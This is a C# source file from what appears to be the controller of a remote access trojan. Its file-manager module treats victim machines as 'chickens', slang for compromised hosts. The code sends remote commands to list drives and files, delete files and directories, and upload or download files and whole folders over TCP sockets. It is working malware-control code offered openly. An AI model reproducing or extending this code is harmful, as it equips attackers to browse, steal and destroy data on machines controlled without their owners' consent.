/******************************************
 * 版权所有jackch
 * QQ:106050555
 * E-mail:jackch88@hotmail.com
 * 个人Blog:http://www.jackch.cn
 * CSDN_Blog:http://blog.csdn.net/jackch88/
 * ****************************************/
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.Win32;
using System.Collections;
using Jackch;
using FarsiLibrary.Win;

//*********************************************************************************
//文件操作相关函数
namespace Jackch
{
    public partial class MainForm
    {
        private void InitFile()
        {
           
            Icon ic0 = myExtractIcon("%SystemRoot%\\system32\\shell32.dll", 15);
            TreeImageList.Images.Add(ic0);
            Icon ic1 = myExtractIcon("%SystemRoot%\\system32\\shell32.dll", 5);
            TreeImageList.Images.Add(ic1);
            Icon ic2 = myExtractIcon("%SystemRoot%\\system32\\shell32.dll", 7);
            TreeImageList.Images.Add(ic2);
            Icon ic3 = myExtractIcon("%SystemRoot%\\system32\\shell32.dll", 11);
            TreeImageList.Images.Add(ic3);
            Icon ic4 = myExtractIcon("%SystemRoot%\\system32\\shell32.dll", 3);
            TreeImageList.Images.Add(ic4);
            Icon ic5 = myExtractIcon("%SystemRoot%\\system32\\shell32.dll", 4);
            TreeImageList.Images.Add(ic5);
            Icon ic6 = myExtractIcon("%SystemRoot%\\system32\\shell32.dll", 101);
            TreeImageList.Images.Add(ic6);

            TreeNode RootNode = new TreeNode("我的电脑", 0, 0);
            treeView1.Nodes.Add(RootNode);
            TreeNode RootNode2 = new TreeNode("远程主机", 0, 0);
            treeView1.Nodes.Add(RootNode2);

            GetDrive();
            GetDriverList();
        }
        
        [DllImport("Shell32.dll")]
        public static extern int ExtractIcon(IntPtr h, string strx, int ii);

        [DllImport("Shell32.dll")]
        public static extern int SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbFileInfo, uint uFlags);

        //获取驱动列表
        [StructLayout(LayoutKind.Sequential)]
        public struct SHFILEINFO
        {
            public IntPtr hIcon;
            public int iIcon;
            public int dwAttributes;
            public string szDisplayName;
            public string szTypeName;
        }

        private bool isLocal = true;
        private string fileName = "";
        //************************************************************************************* 

        protected virtual Icon myExtractIcon(string FileName, int iIndex)
        {
            try
            {
                IntPtr hIcon = (IntPtr)ExtractIcon(this.Handle, FileName, iIndex);
                if (!hIcon.Equals(null))
                {
                    Icon icon = Icon.FromHandle(hIcon);
                    return icon;
                }
            }
            catch (Exception ex)
            { MessageBox.Show(ex.Message, "错误提示", 0, MessageBoxIcon.Error); }
            return null;
        }
        //*************************************************************************************

        protected virtual void SetIcon(ImageList imageList, string FileName, bool tf)
        {
            SHFILEINFO fi = new SHFILEINFO();
            if (tf == true)
            {
                int iTotal = (int)SHGetFileInfo(FileName, 0, ref fi, 100, 16640);//SHGFI_ICON|SHGFI_SMALLICON
                try
                {
                    if (iTotal > 0)
                    {
                        Icon ic = Icon.FromHandle(fi.hIcon);
                        imageList.Images.Add(ic);
                        //return ic;
                    }
                }
                catch (Exception ex)
                { MessageBox.Show(ex.Message, "错误提示", 0, MessageBoxIcon.Error); }
            }
            else
            {
                int iTotal = (int)SHGetFileInfo(FileName, 0, ref fi, 100, 257);
                try
                {
                    if (iTotal > 0)
                    {
                        Icon ic = Icon.FromHandle(fi.hIcon);
                        imageList.Images.Add(ic);
                        //return ic;
                    }
                }
                catch (Exception ex)
                { MessageBox.Show(ex.Message, "错误提示", 0, MessageBoxIcon.Error); }
            }
            // return null;
        }
        //*************************************************************************************
        /// <summary>
        /// 获取本地磁盘树视列表
        /// </summary>
        public void GetDrive()
        {
            treeView1.BeginUpdate();

            int iImageIndex = 2; int iSelectedIndex = 2;

            string[] astrDrives = Directory.GetLogicalDrives();

            foreach (string str in astrDrives)
            {
                if (str == "A:\\")
                { iImageIndex = 1; iSelectedIndex = 1; continue; }
                else
                { iImageIndex = 2; iSelectedIndex = 2; }

                TreeNode tnDrive = new TreeNode(str, iImageIndex, iSelectedIndex);
                treeView1.Nodes[0].Nodes.Add(tnDrive);
            }

            treeView1.EndUpdate();

        }
        //*************************************************************************************

        private void AddDirectories(TreeNode tn)
        {
            
            tn.Nodes.Clear();

            //string str = Path.Combine(fileName, listViewFile.FocusedItem.Text);
            string strPath = tn.FullPath;
            strPath = strPath.Remove(0, 5);
            
           //获得当前目录
            DirectoryInfo dirinfo = new DirectoryInfo(strPath);
            DirectoryInfo[] adirinfo;
            try
            {
                adirinfo = dirinfo.GetDirectories();
            }
            catch
            { return; }

            int iImageIndex = 4; int iSelectedIndex = 5;
            foreach (DirectoryInfo di in adirinfo)
            {
                TreeNode tnDir = new TreeNode(di.Name, iImageIndex, iSelectedIndex);
                tn.Nodes.Add(tnDir);

            }
        }
        //*************************************************************************************
        private void treeView1_BeforeExpand(object sender, System.Windows.Forms.TreeViewCancelEventArgs e)
        {
            //MessageBox.Show(e.Node.ToString());
            treeView1.BeginUpdate();
            
            foreach (TreeNode tn in e.Node.Nodes)
            {
                AddDirectories(tn); 
            }
            
            treeView1.EndUpdate();
        }

        //*************************************************************************************

        protected virtual void InitList(TreeNode tn)
        {
            this.statusBarPanel2.Text = "正在刷新文件夹，请稍等...";
            //this.Cursor = Cursors.WaitCursor;

            this.LargeimageList.Images.Clear();
            this.SmallimageList.Images.Clear();
            //listViewFile.SmallImageList = SmallimageList;
            Icon ic0 = myExtractIcon("%SystemRoot%\\system32\\shell32.dll", 3);
            SmallimageList.Images.Add(ic0);
            LargeimageList.Images.Add(ic0);

            listViewFile.Items.Clear();


            
            string strPath = tn.FullPath;
            strPath = strPath.Remove(0, 5);
            
            //获得当前目录下的所有文件 
            DirectoryInfo curDir = new DirectoryInfo(strPath);//创建目录对象。
            FileInfo[] dirFiles = null;
            fileName = curDir.FullName;
            try
            {
                dirFiles = curDir.GetFiles();
            }
            catch 
            {
                this.toolStripComboBox1.Text = fileName;
                this.statusBarPanel2.Text = "获取文件列表成功"; 
                return;
            }

            string[] arrSubItem = new string[4];
            //文件的创建时间和修改时间。
            int iCount = 0; int iconIndex = 1;//用1，而不用0是要让过0号图标。
            foreach (FileInfo fileInfo in dirFiles)
            {
                string strFileName = fileInfo.Name;

                //如果不是文件pagefile.sys
                if (!strFileName.Equals("pagefile.sys"))
                {
                    arrSubItem[0] = strFileName;
                    arrSubItem[1] = fileInfo.Length + " 字节";
                    arrSubItem[2] = fileInfo.CreationTime.ToString();
                    arrSubItem[3] = fileInfo.LastWriteTime.ToString();
                }
                else
                { arrSubItem[1] = "未知大小"; arrSubItem[2] = "未知日期"; arrSubItem[3] = "未知日期"; }


                //得到每个文件的图标
                string str = fileInfo.FullName;
                try
                {
                    SetIcon(SmallimageList, str, false);
                    SetIcon(LargeimageList, str, true);
                }
                catch (Exception ex)
                { MessageBox.Show(ex.Message, "错误提示", 0, MessageBoxIcon.Error); }


                //插入列表项    
                ListViewItem LiItem = new ListViewItem(arrSubItem, iconIndex);
                listViewFile.Items.Insert(iCount, LiItem);

                iCount++;
                iconIndex++;
            }
            this.textBox4.Text ="当前目录:"+strPath+"\n 文件数量: " + iCount.ToString() + "个";
            //this.Cursor = Cursors.Arrow;

            //以下是向列表框中插入目录，不是文件。获得当前目录下的各个子目录。
            int iItem = 0;
            DirectoryInfo Dir = new DirectoryInfo(strPath);
            foreach (DirectoryInfo di in Dir.GetDirectories())
            {
                ListViewItem LiItem = new ListViewItem(di.Name, 0);
                listViewFile.Items.Insert(iItem, LiItem);
                iItem++;
            }
            this.toolStripComboBox1.Text = fileName; 
            this.statusBarPanel2.Text = "获取文件列表成功";
        }
        //*************************************************************************************

        protected virtual void InitList2(string strName)
        {
            this.statusBarPanel2.Text = "正在刷新文件夹，请稍等...";
            //this.Cursor = Cursors.WaitCursor;

            this.LargeimageList.Images.Clear();
            this.SmallimageList.Images.Clear();
            //listViewFile.SmallImageList = SmallimageList;
            Icon ic0 = myExtractIcon("%SystemRoot%\\system32\\shell32.dll", 3);
            SmallimageList.Images.Add(ic0);
            LargeimageList.Images.Add(ic0);

            listViewFile.Items.Clear();

            //获得当前目录下的所有文件 
            DirectoryInfo Dir = new DirectoryInfo(strName);//创建目录对象。
            DirectoryInfo[] dirDir=null;
            FileInfo[] dirFiles=null;
            if (!isLocal)
            {
                if(!chickens.CurrentChicken.WriteToServer("Filelist " + strName))
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,获取文件列表失败";
                    return;
                }
                bool isConnected = true;
                string str = chickens.CurrentChicken.ReadFromServer(out isConnected);
                if (!isConnected)
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,获取文件列表失败";
                    return;
                }
                richTextBox.Text = str;
                
                int iItem = 0;
                for (int i = 1; i < richTextBox.Lines.Length - 1; ++i)
                {
                    if (richTextBox.Lines[i].ToString().Substring(0, 2) == "F:")
                    {
                        int iCount = 0; int iconIndex = 1;//用1，而不用0是要让过0号图标。
                        string[] rs = richTextBox.Lines[i].ToString().Split('\t');    
                        FileInfo fileInfo = new FileInfo(rs[0].Substring(2));
                        string strFileName = fileInfo.Name; 
                        string[] arrSubItem = new string[4];
                        //获取文件属性
                        arrSubItem[0] = strFileName;
                        arrSubItem[1] = rs[1] + " 字节";
                        arrSubItem[2] = rs[2].ToString();
                        arrSubItem[3] = rs[3].ToString();

                        //得到每个文件的图标
                        string sf = fileInfo.FullName;
                        try
                        {
                            SmallimageList.Images.Add(FileIcon.GetFileIcon(sf,false));
                            LargeimageList.Images.Add(FileIcon.GetFileIcon(sf,false));
                        }
                        catch (Exception ex)
                        { MessageBox.Show(ex.Message, "错误提示", 0, MessageBoxIcon.Error); }

                        iconIndex=LargeimageList.Images.Count-1;
                        ListViewItem LiItem = new ListViewItem(arrSubItem, iconIndex);
                        listViewFile.Items.Insert(iCount, LiItem);
                        iCount++;
                        iconIndex++;//必须加在listViewFile.Items.Insert(iCount,LiItem);       
                    }
                    else if (richTextBox.Lines[i].ToString().Substring(0, 2) == "D:")
                    {
                        DirectoryInfo d = new DirectoryInfo(richTextBox.Lines[i].ToString().Substring(2));
                        ListViewItem LiItem = new ListViewItem(d.Name, 0);
                        listViewFile.Items.Insert(iItem, LiItem);
                        ++iItem;
                    }  
                }
            }
            else
            {

                try
                {
                    dirDir = Dir.GetDirectories();
                    dirFiles = Dir.GetFiles();
                }
                catch 
                {
                    //MessageBox.Show("本地目录无法打开", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    fileName = strName;//把路径赋值于全局变量fileName
                    this.toolStripComboBox1.Text = fileName;
                    this.statusBarPanel2.Text = "获取文件列表成功";
                    return;
                }
                string[] arrSubItem = new string[4];
                //文件的创建时间和修改时间。
                int iCount = 0; int iconIndex = 1;//用1，而不用0是要让过0号图标。
                foreach (FileInfo fileInfo in dirFiles)
                {
                    string strFileName = fileInfo.Name;
                    //获取文件属性
                    arrSubItem[0] = strFileName;
                    arrSubItem[1] = fileInfo.Length + " 字节";
                    arrSubItem[2] = fileInfo.CreationTime.ToString();
                    arrSubItem[3] = fileInfo.LastWriteTime.ToString();
                    

                    //得到每个文件的图标
                    string str = fileInfo.FullName;
                    try
                    {
                        SetIcon(SmallimageList, str, false);
                        SetIcon(LargeimageList, str, true);
                    }
                    catch (Exception ex)
                    { MessageBox.Show(ex.Message, "错误提示", 0, MessageBoxIcon.Error); }


                    //插入列表项    
                    ListViewItem LiItem = new ListViewItem(arrSubItem, iconIndex);
                    listViewFile.Items.Insert(iCount, LiItem);

                    iCount++;
                    iconIndex++;//必须加在listViewFile.Items.Insert(iCount,LiItem);
                }
                
                this.textBox4.Text = "当前目录:" + strName + "\n 文件数量: " + iCount.ToString() + "个";

                //以下是向列表框中插入目录，不是文件。获得当前目录下的各个子目录。
                int iItem = 0;//调用listViewFile.Items.Insert(iItem,LiItem);时用。不能使用iconIndex。

                foreach (DirectoryInfo di in dirDir)
                {
                    ListViewItem LiItem = new ListViewItem(di.Name, 0);
                    listViewFile.Items.Insert(iItem, LiItem);
                    iItem++;
                }
            }
            fileName = strName;//把路径赋值于全局变量fileName
            this.toolStripComboBox1.Text = fileName;
            this.statusBarPanel2.Text = "获取文件列表成功";
        }

        //*************************************************************************************

        private void treeView1_AfterSelect(object sender, System.Windows.Forms.TreeViewEventArgs e)
        {
            if (e.Node.Text == "我的电脑")
            {
                chickens.CurrentChicken = null;
                isLocal = true;
                this.textBox1.Text = "LocalHost(127.0.0.1)";
                GetDriverList();
            }
            else if (e.Node.Text == "远程主机")//不做处理
            {
                isLocal = true;
                chickens.CurrentChicken = null;
                listViewFile.Items.Clear();
                this.textBox1.Text = "None(0.0.0.0)";
                this.toolStripComboBox1.Text = "";
                return;
            }
            else if (e.Node.Parent == treeView1.Nodes[1])
            {
                chickens.CurrentChicken = null;
                isLocal = false; 
                for(int i=0;i< treeView1.Nodes[1].Nodes.Count;++i)
                {
                    if (e.Node == treeView1.Nodes[1].Nodes[i])
                    {
                        chickens.CurrentChicken = chickens[i];
                        break;
                    }
                }
                this.textBox1.Text = "RemoteHost("+chickens.CurrentChicken.IP.ToString()+")";
                GetDriverList();
            }
            else
            {
                chickens.CurrentChicken = null;
                isLocal = true;
                this.textBox1.Text = "LocalHost(127.0.0.1)";
                InitList(e.Node);
                
            }
        }

        //*************************************************************************************

        private void listViewFile_ItemActivate(object sender, System.EventArgs e)
        {
            string str = Path.Combine(fileName, listViewFile.FocusedItem.Text);
            try
            {
                if (listViewFile.FocusedItem.SubItems.Count > 1&&isLocal)
                { 
                    System.Diagnostics.Process.Start(str); 
                }
                else if (listViewFile.FocusedItem.SubItems.Count > 1 && !isLocal)
                {
                    //MessageBox.Show("请先下载","提示");
                }
                else
                { 
                    InitList2(str); 
                }
            }
            catch { return; }
        }
        /// <summary>
        /// 获取磁盘目录列表
        /// </summary>
        private void GetDriverList()
        {
            if (isLocal)
            {
                listViewFile.Items.Clear();
                this.LargeimageList.Images.Clear();
                this.SmallimageList.Images.Clear();
                string[] drives = Environment.GetLogicalDrives();
                for (int i = 0; i < drives.Length; i++)
                {
                    SHFILEINFO FileInfo = new SHFILEINFO();
                    SHGetFileInfo(drives[i], 0, ref FileInfo, Marshal.SizeOf(FileInfo), SHGFI_ICON | SHGFI_LARGEICON);

                    Icon myIcon;
                    myIcon = Icon.FromHandle(FileInfo.hIcon);
                    LargeimageList.Images.Add(myIcon);
                    SmallimageList.Images.Add(myIcon);
                }
                for (int i = 0; i < drives.Length; i++)
                {
                    if (drives[i].ToString() == "A:\\")
                        continue;
                    string str_temp = drives[i].ToString();
                    ListViewItem ls = new ListViewItem(str_temp, i);
                    this.listViewFile.Items.Add(ls);
                }

                this.statusBarPanel2.Text = "连接本地主机成功";
            }
            else
            {
                this.statusBarPanel2.Text = "连接主机：" + chickens.CurrentChicken.IP.ToString() + "成功";

                //********************获取驱动磁盘***********************
                if(!chickens.CurrentChicken.WriteToServer("Driverlist"))
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,获取磁盘目录失败";
                    return;
                }
                bool isConnected = true;
                string str = chickens.CurrentChicken.ReadFromServer(out isConnected);
                if (!isConnected)
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,获取磁盘目录失败";
                    return;
                }
                richTextBox.Text = str;

                listViewFile.Items.Clear();
                this.LargeimageList.Images.Clear();
                this.SmallimageList.Images.Clear();

                Icon ic0 = myExtractIcon("%SystemRoot%\\system32\\shell32.dll", 7);
                this.LargeimageList.Images.Add(ic0);
                this.SmallimageList.Images.Add(ic0);
                for (int i = 1; i < richTextBox.Lines.Length - 1; i++)
                {
                    if (richTextBox.Lines[i].ToString() == "A:\\" || richTextBox.Lines[i].ToString() == "")
                        continue;
                    string str_temp = richTextBox.Lines[i].ToString();
                    ListViewItem ls = new ListViewItem(str_temp, 0);
                    this.listViewFile.Items.Add(ls);
                }
            }
            fileName = "";
            this.toolStripComboBox1.Text = "我的电脑";
        }
        /// <summary>
        /// 删除文件
        /// </summary>
        private void DeleteFile(string file)
        {
            if (isLocal)
            {
                try
                {
                    File.Delete(file);
                }
                catch(Exception ee)
                {
                    MessageBox.Show(ee.ToString());
                }
            }
            else
            {
                if (!chickens.CurrentChicken.WriteToServer("DeleteFile " + file))
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,删除文件失败";
                    return;
                }
                bool isConnected = true;
                string str = chickens.CurrentChicken.ReadFromServer(out isConnected);
                if (!isConnected)
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,删除文件失败";
                    return;
                }
            }
            RefDir();
        }
        /// <summary>
        /// 删除目录
        /// </summary>
        /// <param name="file"></param>
        private void DeleteDir(string file)
        {
            if (isLocal)
            {
                DirectoryInfo d = new DirectoryInfo(file);
                foreach (FileInfo f in d.GetFiles())
                    f.Delete();
                foreach (DirectoryInfo dd in d.GetDirectories())
                    DeleteDir(dd.FullName);
                d.Delete();
            }
            else
            {
                if (!chickens.CurrentChicken.WriteToServer("DeleteDirectory " + file))
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,删除目录失败";
                    return;
                }
                bool isConnected = true;
                string str = chickens.CurrentChicken.ReadFromServer(out isConnected);
                if (!isConnected)
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,删除目录失败";
                    return;
                }
            }
            RefDir();
        }
        /// <summary>
        /// 刷新文件列表
        /// </summary>
        private void RefDir()
        {
            if (fileName=="")
            {
                GetDriverList();
            }
            else
                InitList2(fileName);
        }



        private delegate void UpdaterProgressBar(ToolStripProgressBar t,int v);
        public void SetProgressBar(ToolStripProgressBar t, int v)
        {
            t.Value = v;
        }
        /// <summary>
        /// 客户端上传文件
        /// </summary>
        private void Upload()
        {
            newListener = new TcpListener(ip, port + 1);
            newListener.Start();
            newSocket = newListener.AcceptSocket();
            if (newSocket.Connected)
            {
                up(ref newSocket);
            }
            newSocket.Close();
            newListener.Stop();
        }
        private void up(ref Socket newSocket)
        {
            toolStrip3.Invoke(new UpdaterProgressBar(SetProgressBar), new object[] { toolStripProgressBar1, 0 });
            int number = 0;
            byte[] by = new byte[1024];
            long sum = 0;
            while ((number = fileStream.Read(by, 0, 1024)) > 0)
            {
                newSocket.Send(by);
                fileStream.Flush();
                by = new byte[1024];
                sum += number;
                toolStrip3.Invoke(new UpdaterProgressBar(SetProgressBar), new object[] { toolStripProgressBar1, (int)(100 * ((double)sum / fileStream.Length)) }); 
            }
            fileStream.Close();
            toolStrip3.Invoke(new UpdaterProgressBar(SetProgressBar), new object[] { toolStripProgressBar1, 0 }); 
            listView9.Invoke(new Updater4(DelListViewItem), new object[] { listView9, 0 });
        }

        /// <summary>
        /// 客户端下载文件
        /// </summary>
        private void Download()
        {
            newListener = new TcpListener(ip, port + 2);
            newListener.Start();
            newSocket = newListener.AcceptSocket();
            if (newSocket.Connected)
            {
                down(ref newSocket);
            }
            newSocket.Close();
            newListener.Stop();
        }
        private void down(ref Socket newSocket)
        {
            toolStrip3.Invoke(new UpdaterProgressBar(SetProgressBar), new object[] { toolStripProgressBar1, 0 }); 
            int number = 0;
            byte[] by = new byte[1024];
            long sum = 0; 
            while ((number = newSocket.Receive(by)) > 0)
            {
                fileStream.Write(by, 0, by.Length);
                fileStream.Flush();
                by = new byte[1024];
                sum += number;
                toolStrip3.Invoke(new UpdaterProgressBar(SetProgressBar), new object[] { toolStripProgressBar1, (int)(100 * ((double)sum / fileStream.Length)) });
            }
            fileStream.Close();
            toolStrip3.Invoke(new UpdaterProgressBar(SetProgressBar), new object[] { toolStripProgressBar1, 0 });
            listView9.Invoke(new Updater4(DelListViewItem), new object[] { listView9, 0 });
        }
        /// <summary>
        /// 上传文件夹
        /// </summary>
        private void Updir()
        {
            newListener = new TcpListener(ip, port + 1);
            newListener.Start();
            newSocket = newListener.AcceptSocket();
            if (newSocket.Connected)
            {
                updir(dir.FullName);
                newSocket.Send(System.Text.Encoding.Unicode.GetBytes("end"));
            }
            newSocket.Close();
            newListener.Stop();
        }
        private void updir(string str)
        {
            byte[] by = new byte[1024];
            DirectoryInfo d = new DirectoryInfo(str);

            string rd = (string)(listView9.Invoke(new dListViewSubItems(GetListViewSubItems), new object[] { listView9, 0, 4 }));
            
            listView9.Invoke(new Updater4(DelListViewItem), new object[] { listView9, 0 });
            foreach (FileInfo f in d.GetFiles())
            {

                ListViewItem lv = new ListViewItem("", 5);
                ListViewItem.ListViewSubItem s0 = new ListViewItem.ListViewSubItem();
                s0.Text = f.Name;
                ListViewItem.ListViewSubItem s1 = new ListViewItem.ListViewSubItem();
                s1.Text = chickensTrans.CurrentChicken.IP.ToString();
                ListViewItem.ListViewSubItem s2 = new ListViewItem.ListViewSubItem();
                s2.Text = f.FullName;
                ListViewItem.ListViewSubItem s3 = new ListViewItem.ListViewSubItem();
                s3.Text = rd + f.Name;

                lv.SubItems.AddRange(new ListViewItem.ListViewSubItem[] { s0, s1, s2, s3 });
                listView9.Invoke(new dInsertListViewItem(InsertListViewItem), new object[] { listView9, 0, lv });
                fileStream = new FileStream(f.FullName, FileMode.Open, FileAccess.Read);
                string s = f.FullName.Remove(0, dir.FullName.Length + 1) + "\r" + f.Length.ToString(); 
                for (int i = s.Length; i < 512; ++i)
                    s += "\r"; 
                by = System.Text.Encoding.Unicode.GetBytes(s);
                newSocket.Send(by);
                up(ref newSocket);
            }
            foreach (DirectoryInfo dd in d.GetDirectories())
            {
                ListViewItem lv = new ListViewItem("", 7);
                ListViewItem.ListViewSubItem s0 = new ListViewItem.ListViewSubItem();
                s0.Text = dd.Name;
                ListViewItem.ListViewSubItem s1 = new ListViewItem.ListViewSubItem();
                s1.Text = chickensTrans.CurrentChicken.IP.ToString();
                ListViewItem.ListViewSubItem s2 = new ListViewItem.ListViewSubItem();
                s2.Text = dd.FullName;
                ListViewItem.ListViewSubItem s3 = new ListViewItem.ListViewSubItem();
                s3.Text = rd + dd.Name;

                lv.SubItems.AddRange(new ListViewItem.ListViewSubItem[] { s0, s1, s2, s3 });
                listView9.Invoke(new dInsertListViewItem(InsertListViewItem), new object[] { listView9, 0, lv });

                string s = "Mkdir\r" + dd.FullName.Remove(0, dir.FullName.Length + 1);
                for (int i = s.Length; i < 512; ++i)
                    s += "\r";
                by = System.Text.Encoding.Unicode.GetBytes(s);
                newSocket.Send(by);
                updir(dd.FullName);
            }
        }
        /// <summary>
        /// 下载文件夹
        /// </summary>
        private void Downdir()
        {
            newListener = new TcpListener(ip, port + 2);
            newListener.Start();
            newSocket = newListener.AcceptSocket();
            if (newSocket.Connected)
            {
                downdir(dir.FullName);
            }
            newSocket.Close();
            newListener.Stop();
        }
        private void downdir(string str)
        {
            int number = 0;
            byte[] by = new byte[1024];
            dir.Create();
            while (true)
            {
                string s = "";
                bool isfile = true;
                while (true)
                {
                    if ((number = newSocket.Receive(by)) > 0)
                    {
                        s = System.Text.Encoding.Unicode.GetString(by, 0, number);
                        if (s == "end")//文件夹传输完毕
                        {
                            newSocket.Close();
                            listView9.Invoke(new Updater4(DelListViewItem), new object[] { listView9, 0 });
                            return;
                        }
                        else if (s.Split('\r')[0] == "Mkdir")//新建文件目录
                        {
                            Directory.CreateDirectory(dir + @"\" + s.Split('\r')[1]);
                            isfile = false;
                        }
                        else
                        {
                            isfile = true;
                            by = new byte[1024];
                        }
                        break;
                    }
                }
                if (!isfile)
                    continue;
                string f = Path.Combine(dir.FullName, s.Split('\r')[0]);
                FileStream fs= new FileStream(f, FileMode.OpenOrCreate, FileAccess.Write);
                long len = long.Parse(s.Split('\r')[1]);
                while (len > 0)
                {
                    if ((number = newSocket.Receive(by)) > 0)
                    {
                        fs.Write(by, 0, by.Length);
                        fs.Flush();
                        len -= number;
                    }
                    by = new byte[1024];
                }
                fs.Close();
            }
        }
    }
}